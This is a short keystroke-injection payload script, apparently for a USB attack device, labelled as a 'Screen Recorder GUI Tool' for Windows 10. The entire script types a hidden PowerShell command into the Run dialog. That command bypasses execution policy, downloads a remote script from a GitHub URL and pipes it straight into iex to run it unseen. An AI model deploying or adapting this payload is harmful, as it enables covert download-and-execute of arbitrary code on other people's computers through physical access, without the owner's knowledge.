// Title: beigeworm's Screen Recorder GUI Tool.
// Author: @beigeworm
// Description: This script creates a GUI window for recording the screen to .mkv file.
// Target: Windows 10

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigew0rm/PwnPi-Scripts/main/Fast-Execution/Record-Screen-GUI/main.ps1 | iex");
delay(500);
press("ENTER");

